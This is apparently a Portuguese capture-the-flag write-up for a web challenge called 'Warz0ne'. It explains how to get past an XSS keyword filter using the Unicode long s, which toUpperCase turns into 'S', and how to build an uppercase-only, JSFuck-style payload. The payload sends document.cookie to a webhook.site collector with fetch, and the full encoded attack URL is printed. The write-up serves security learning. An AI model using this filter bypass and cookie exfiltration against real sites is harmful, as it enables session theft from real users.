# Warz0ne

- Data do desafio: 2020-05-15
- Categoria: web

A página possui um campo de texto e um botão que insere o texto em uma parte da página, convertendo-o para caixa alta. Essa inserção é feita pelo parâmetro `msg` da URL, então podemos manipulá-lo diretamente.

```html
<html>
<body style="background-color: #62AAFC;text-align: center;">
<h1> Texo em caixa alta para uma boa treta</h1>
<div>
<form>
<label for="fname">Mensagem:</label><br><br>
<input type="text" name="msg" value="hello"><br><br>
<input type="submit" value="Submit">
</form>
<p id='msgtext'></p>
</div>
<script>var w = "undefined";var msg = w.toUpperCase();document.getElementById("msgtext").innerHTML = msg;</script>
</body>
</html>
```

## Bypass

Ao inserir alguns textos para obter um XSS, percebemos que alguns termos, como "script", "src" e "on" são filtrados. Esta filtragem ocorre antes de o conteúdo ser convertido para caixa alta, então podemos procurar algum caractere que passe pelo filtro mas, ao ser convertido, seja igual a um dos caracteres que queremos. Vamos, por exemplo, procurar por todos os caracteres que são convertidos para "S":

```javascript
for (var i = 0; i < 1000; i++) {
  if (String.fromCharCode(i).toUpperCase() === "S") {
    console.log(i, String.fromCharCode(i));
  }
}
```

O resultado:

```
83 S
115 s
383 ſ
```

Ou seja, o caractere "ſ" (U+017F Latin Small Letter Long S) é convertido para "S" pela função `toUpperCase`, permitindo inserir termos como "script" e "src". Na verdade, o Keerok já havia postado um [tweet](https://twitter.com/k33r0k/status/1252324682151362566) sobre isso!

Infelizmente, nenhum caractere diferente de "o", "O", "n" e "N" é convertido para "O" ou "N", então teremos que fazer um payload com "script" ou "src" mesmo.

## Payload

Se tentarmos inserir `<ſcript>alert(1)</ſcript>`, o conteúdo é inserido mas o código não é executado porque ele foi inserido usando `innerHTML` e isso [não é permitido pela especificação do HTML 5](https://www.w3.org/TR/2008/WD-html5-20080610/dom.html#innerhtml0):

> Note: script elements inserted using innerHTML do not execute when they are inserted.

Em outra tentativa, o payload `<iframe ſrc=javaſcript:alert(1)>` chega mais próximo, mas retorna um erro: `ReferenceError: ALERT is not defined`. Termos como `IFRAME` E `JAVASCRIPT` são devidamente interpretados pelo navegador, mas como o JS distingue maiúsculas e minúsculas, a função `ALERT` não existe e o erro é retornado. Precisamos encontrar uma forma de executar JS utilizando apenas maiúsculas.

Primeiro, vamos definir qual será nosso payload: `fetch('http://webhook.site/<id>?c='+document.cookie)` (onde `<id>` é o seu código do webhook). Como todo o payload utiliza letras minúsculas, o método `toLowerCase` resolveria nossos problemas.

Vamos utilizar algumas técnicas do [JSFuck](http://www.jsfuck.com/) para representar alguns objetos e funções úteis. Baseado [neste post](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce), criei uma variável para cada letra minúscula:

```javascript
Á=![];
É=!![];
Í=[][[]];
Ó=+[![]];
SI=+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]]+[+[]]);
ST=([]+[]);
Ü=(+[]);
A=(Á+'')[1];
D=(Í+'')[2];
E=(É+'')[3];
F=(Á+'')[0];
G=[![]+[+[]]+[[]+[]][+[]][[![]+{}][+[]][+!+[]+[+[]]]+[[]+{}][+[]][+!+[]]+[[][[]]+[]][+[]][+!+[]]+[![]+[]][+[]][!+[]+!+[]+!+[]]+[!![]+[]][+[]][+[]]+[!![]+[]][+[]][+!+[]]+[[][[]]+[]][+[]][+[]]+[![]+{}][+[]][+!+[]+[+[]]]+[!![]+[]][+[]][+[]]+[[]+{}][+[]][+!+[]]+[!![]+[]][+[]][+!+[]]]][+[]][!+[]+!+[]+[+[]]];
I=([Á]+Í)[10];
L=(Á+'')[2];
T=(É+'')[0];
O=(É+[][F+I+L+L])[10];
R=(É+'')[1];
N=(Í+'')[1];
M=(+(208))[T+O+'S'+T+R+I+N+G](31)[1];
P=(+(211))[T+O+'S'+T+R+I+N+G](31)[1];
S=(Á+'')[3];
U=(Í+'')[0];
V=(+(31))[T+O+'S'+T+R+I+N+G](32);
X=(+(101))[T+O+'S'+T+R+I+N+G](34)[1];
Y=(Ó+[SI])[10];
Z=(+(35))[T+O+'S'+T+R+I+N+G](36);
C=([][F+I+L+L]+'')[3];
H=(+(101))[T+O+'S'+T+R+I+N+G](21)[1];
K=(+(20))[T+O+'S'+T+R+I+N+G](21);
W=(+(32))[T+O+'S'+T+R+I+N+G](33);
J=([][E+N+T+R+I+E+S]()+'')[3];
B=([][E+N+T+R+I+E+S]()+'')[2];
SP=([]+[])[C+O+N+S+T+R+U+C+T+O+R][F+R+O+M+'C'+H+A+R+'C'+O+D+E](32);
```

Com estas variáveis, podemos representar o cookie da seguinte forma:

```javascript
WINDOW=[][F+I+L+L][C+O+N+S+T+R+U+C+T+O+R](R+E+T+U+R+N+SP+T+H+I+S)();
COOKIE=WINDOW[D+O+C+U+M+E+N+T][C+O+O+K+I+E];
```

A URL e a execução do `fetch` são representados da seguinte forma (não se esqueça de alterar o `<id>`!):

```javascript
URL=['https://webhook.site/<id>%3Fc='][0][T+O+'L'+O+W+E+R+'C'+A+S+E]();
WINDOW[F+E+T+C+H](URL+COOKIE);
```

Precisamos unir todo o código e substituir o caractere "+" por "%2B" para que ele seja devidamente interpretado pelo navegador. Assim, o payload final é:

```
http://159.65.249.122:8585/?msg=%3Ciframe%20%C5%BFrc=java%C5%BFcript:%C3%81=![];%C3%89=!![];%C3%8D=[][[]];%C3%93=%2B[![]];SI=%2B(%2B!%2B[]%2B(!%2B[]%2B[])[!%2B[]%2B!%2B[]%2B!%2B[]]%2B[%2B!%2B[]]%2B[%2B[]]%2B[%2B[]]%2B[%2B[]]);ST=([]%2B[]);%C3%9C=(%2B[]);A=(%C3%81%2B%27%27)[1];D=(%C3%8D%2B%27%27)[2];E=(%C3%89%2B%27%27)[3];F=(%C3%81%2B%27%27)[0];G=[![]%2B[%2B[]]%2B[[]%2B[]][%2B[]][[![]%2B{}][%2B[]][%2B!%2B[]%2B[%2B[]]]%2B[[]%2B{}][%2B[]][%2B!%2B[]]%2B[[][[]]%2B[]][%2B[]][%2B!%2B[]]%2B[![]%2B[]][%2B[]][!%2B[]%2B!%2B[]%2B!%2B[]]%2B[!![]%2B[]][%2B[]][%2B[]]%2B[!![]%2B[]][%2B[]][%2B!%2B[]]%2B[[][[]]%2B[]][%2B[]][%2B[]]%2B[![]%2B{}][%2B[]][%2B!%2B[]%2B[%2B[]]]%2B[!![]%2B[]][%2B[]][%2B[]]%2B[[]%2B{}][%2B[]][%2B!%2B[]]%2B[!![]%2B[]][%2B[]][%2B!%2B[]]]][%2B[]][!%2B[]%2B!%2B[]%2B[%2B[]]];I=([%C3%81]%2B%C3%8D)[10];L=(%C3%81%2B%27%27)[2];T=(%C3%89%2B%27%27)[0];O=(%C3%89%2B[][F%2BI%2BL%2BL])[10];R=(%C3%89%2B%27%27)[1];N=(%C3%8D%2B%27%27)[1];M=(%2B(208))[T%2BO%2B%27S%27%2BT%2BR%2BI%2BN%2BG](31)[1];P=(%2B(211))[T%2BO%2B%27S%27%2BT%2BR%2BI%2BN%2BG](31)[1];S=(%C3%81%2B%27%27)[3];U=(%C3%8D%2B%27%27)[0];V=(%2B(31))[T%2BO%2B%27S%27%2BT%2BR%2BI%2BN%2BG](32);X=(%2B(101))[T%2BO%2B%27S%27%2BT%2BR%2BI%2BN%2BG](34)[1];Y=(%C3%93%2B[SI])[10];Z=(%2B(35))[T%2BO%2B%27S%27%2BT%2BR%2BI%2BN%2BG](36);C=([][F%2BI%2BL%2BL]%2B%27%27)[3];H=(%2B(101))[T%2BO%2B%27S%27%2BT%2BR%2BI%2BN%2BG](21)[1];K=(%2B(20))[T%2BO%2B%27S%27%2BT%2BR%2BI%2BN%2BG](21);W=(%2B(32))[T%2BO%2B%27S%27%2BT%2BR%2BI%2BN%2BG](33);J=([][E%2BN%2BT%2BR%2BI%2BE%2BS]()%2B%27%27)[3];B=([][E%2BN%2BT%2BR%2BI%2BE%2BS]()%2B%27%27)[2];SP=([]%2B[])[C%2BO%2BN%2BS%2BT%2BR%2BU%2BC%2BT%2BO%2BR][F%2BR%2BO%2BM%2B%27C%27%2BH%2BA%2BR%2B%27C%27%2BO%2BD%2BE](32);WINDOW=[][F%2BI%2BL%2BL][C%2BO%2BN%2BS%2BT%2BR%2BU%2BC%2BT%2BO%2BR](R%2BE%2BT%2BU%2BR%2BN%2BSP%2BT%2BH%2BI%2BS)();COOKIE=WINDOW[D%2BO%2BC%2BU%2BM%2BE%2BN%2BT][C%2BO%2BO%2BK%2BI%2BE];URL=[%27https://webhook.site/<id>%3Fc=%27][0][T%2BO%2B%27L%27%2BO%2BW%2BE%2BR%2B%27C%27%2BA%2BS%2BE]();WINDOW[F%2BE%2BT%2BC%2BH](URL%2BCOOKIE);%3E
```

Resta apenas enviar a URL na página `/contact` para obter a flag no webhook.

Flag: `HACKAFLAG{Insira_Um4_fl4g_4qu1}`
